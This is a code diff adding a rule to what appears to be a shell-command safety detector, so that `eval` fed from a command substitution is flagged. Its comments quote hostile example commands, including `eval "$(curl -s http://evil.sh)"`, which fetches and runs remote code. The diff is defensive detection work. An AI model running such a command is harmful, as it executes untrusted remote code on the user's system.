@@ -987,6 +987,18 @@ def shell_program_from_stream(command: str) -> bool:
 
     for idx, seg in enumerate(segments):
         exec_ = _resolve(seg)
+        # `eval "$(cat f)"` / `eval "$(curl -s http://x)"` -- a program-executing
+        # consumer fed from a substitution whose OUTPUT we cannot read. Same
+        # semantic test as the pipe case; pipe-vs-substitution is syntax.
+        #
+        # Deliberately covers ANY substitution rather than only data-readers.
+        # A reader-only rule looked tempting and misses
+        # `eval "$(curl -s http://evil.sh)"` -- remote code, the worst shape in
+        # the set -- so the narrow version was rejected on that, not on taste.
+        # Measured cost of the broad rule: ZERO occurrences in 13,647 commands
+        # across 671 repos, so it gates nothing anyone actually runs here.
+        if exec_ in _EVAL_EXECS and any(w.op is None and w.substs for w in seg):
+            return True
         if exec_ in _SHELL_EXECS:
             # `bash < file` / `bash <<< str` -- the program arrives on stdin.
             for w in seg:
